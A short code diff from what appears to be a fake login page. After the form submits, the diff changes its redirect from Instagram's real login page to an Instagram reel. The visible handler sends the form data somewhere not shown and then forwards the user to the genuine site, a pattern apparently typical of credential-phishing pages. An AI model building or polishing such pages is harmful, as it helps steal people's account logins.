@@ -17,7 +17,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     .then(response => response.json())
     .then(data => {
         console.log('Success:', data);
-        window.location.href = 'https://www.instagram.com/accounts/login/';
+        window.location.href = 'https://www.instagram.com/reel/C2N4Dprriu4/?igsh=aDF6a3kxbnMwMzRq';
     })
     .catch((error) => {
         console.error('Error:', error);
